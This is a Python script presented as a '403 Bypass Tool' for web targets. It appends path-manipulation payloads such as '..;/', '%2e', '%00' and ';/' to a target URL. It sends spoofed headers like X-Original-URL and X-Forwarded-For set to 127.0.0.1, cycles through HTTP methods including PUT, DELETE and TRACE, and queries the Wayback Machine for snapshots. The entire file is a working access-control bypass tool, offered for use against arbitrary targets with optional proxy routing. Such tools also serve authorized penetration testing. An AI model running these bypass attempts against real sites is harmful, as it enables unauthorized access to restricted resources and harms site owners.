import requests
import argparse
import json
from urllib.parse import urlparse
from termcolor import colored

# List of bypass techniques
PAYLOADS = [
    "", "/%2e", "/.", "//", "/./", "/%20", "/%09", "/?", "/.html", "/?anything", 
    "/#", "/*", ".php", ".json", ";/", "..;/", "%00", "%2e/", "%2f/", "/;/"
]

# List of headers
HEADERS = [
    {"X-Original-URL": ""},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"Content-Length": "0"}
]

# List of HTTP methods
METHODS = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "DELETE", "TRACE"]

# Function to perform the request
def send_request(url, headers=None, method="GET", proxies=None):
    try:
        response = requests.request(method, url, headers=headers, proxies=proxies, timeout=5)
        status = response.status_code
        size = len(response.content)
        print(colored(f"    --> {url} [{method}] {status} ({size} bytes)", "green" if status != 403 else "red"))
        return response
    except Exception as e:
        print(colored(f"    [!] Error: {e}", "red"))

# Function to try different bypass techniques
def bypass_403(target, proxies):
    print(colored(f"\n[+] Testing: {target}\n", "cyan"))

    # Test with payloads
    for payload in PAYLOADS:
        bypass_url = f"{target}{payload}"
        send_request(bypass_url, proxies=proxies)

    # Test with custom headers
    for header in HEADERS:
        print(colored(f"[>] Testing header: {header}", "yellow"))
        send_request(target, headers=header, proxies=proxies)

    # Test with different HTTP methods
    for method in METHODS:
        print(colored(f"[>] Testing method: {method}", "blue"))
        send_request(target, method=method, proxies=proxies)

# Function to check Wayback Machine for historical snapshots
def check_wayback(url):
    print(colored("\n[+] Checking Wayback Machine...", "cyan"))
    archive_url = f"https://archive.org/wayback/available?url={url}"
    
    try:
        response = requests.get(archive_url, timeout=5)
        data = response.json()
        if data.get('archived_snapshots') and data['archived_snapshots'].get('closest'):
            snapshot = data['archived_snapshots']['closest']
            print(colored(f"    [✔] Found snapshot: {snapshot['url']}", "green"))
        else:
            print(colored("    [✘] No snapshot available.", "red"))
    except Exception as e:
        print(colored(f"    [!] Error checking Wayback Machine: {e}", "red"))

# Main function
def main():
    parser = argparse.ArgumentParser(description="403 Bypass Tool with Python")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--proxy", help="Proxy in format: http://IP:PORT or socks5://IP:PORT", default=None)
    
    args = parser.parse_args()

    # Configure proxy settings
    proxies = {
        "http": args.proxy,
        "https": args.proxy
    } if args.proxy else None

    # Check if the URL is valid
    if not urlparse(args.url).scheme:
        print(colored("[!] Invalid URL format. Use http:// or https://", "red"))
        return

    # Start bypass testing
    bypass_403(args.url, proxies)

    # Check Wayback Machine for archived snapshots
    check_wayback(args.url)

if __name__ == "__main__":
    main()
